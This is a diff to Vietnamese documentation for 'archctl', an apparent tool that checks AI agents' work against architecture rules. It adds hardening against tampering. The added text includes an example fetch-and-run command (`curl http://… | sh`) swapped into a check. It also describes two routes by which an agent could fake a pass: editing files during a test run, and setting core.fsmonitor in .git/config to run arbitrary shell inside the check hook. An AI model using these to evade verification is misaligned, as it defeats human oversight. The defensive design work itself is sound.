@@ -76,6 +76,16 @@ tại. Biên nhận ghi lại thời điểm chạy và dấu vân tay của lu�
 | luật đã đổi sau lần chạy gần nhất | `.arch/system.arch` đổi về **nội dung**; thêm chú thích thì không tính |
 | mã đã đổi sau lần chạy gần nhất | có file nguồn sửa sau lúc chạy |
 
+**Chính lệnh cũng nằm trong dấu vân tay.** Nếu không thì biên nhận chứng minh
+cho một lệnh không còn tồn tại: đổi `runs "exit 0"` thành
+`runs "curl http://… | sh"` mà vân tay giữ nguyên, và `archctl check` im lặng.
+Nhờ vậy `archctl diff` cũng thấy được thay đổi đó — phần tử người duyệt cần
+đọc kỹ nhất thì không được vô hình.
+
+**Mốc thời gian lấy trước khi lệnh chạy.** Một bộ test chạy hai phút mà agent
+sửa file ở phút thứ nhất: mốc lấy lúc xong sẽ mới hơn file vừa sửa, và lần
+chạy đó im lặng được coi là chứng minh cho mã nó chưa từng thấy.
+
 Thời điểm ghi theo **mili giây**. Giây thì không đủ: sửa mã rồi chạy verify
 ngay là chuyện thường, và khi cả hai rơi vào cùng một giây thì biên nhận vừa
 ghi xong đã bị coi là cũ.
@@ -90,6 +100,7 @@ Biên nhận nằm ở `.arch/.verified` và không vào git.
 | --- | --- |
 | `archctl verify` | chạy lệnh — và chỉ khi người gõ lệnh đó |
 | `archctl check` | **không bao giờ** chạy gì, kể cả trong hook của agent. Nó chỉ đọc biên nhận |
+| mọi lệnh `git` | gọi với `core.fsmonitor=`, `core.pager=cat`, `core.hooksPath=/dev/null` |
 | `archctl propose` | **từ chối** đề xuất khai báo một cách kiểm |
 | `archctl accept` | **từ chối** luôn, ngay trước khi ghi vào file luật |
 
@@ -107,6 +118,12 @@ một-người-ghi-một-file ở [protocol.md](protocol.md).
 
 Cả hai ranh giới đều có test, và test cho `check` dựng một cách kiểm
 `touch <file>` rồi khẳng định file đó không bao giờ xuất hiện.
+
+Dòng cuối không hiển nhiên. `core.fsmonitor` là một lệnh shell, và git chạy
+nó trong `git status` — tức là trong `archctl check --changed`, chính lệnh mà
+`init` cài làm hook của agent. `.git/config` nằm trong repo, và repo là thứ
+agent ghi được. Một dòng ở đó từng đủ để `check` thực thi thứ người viết dòng
+đó chọn, dù `check` không hề gọi `sh` lần nào.
 
 ## Nó không kiểm nội dung lệnh
 
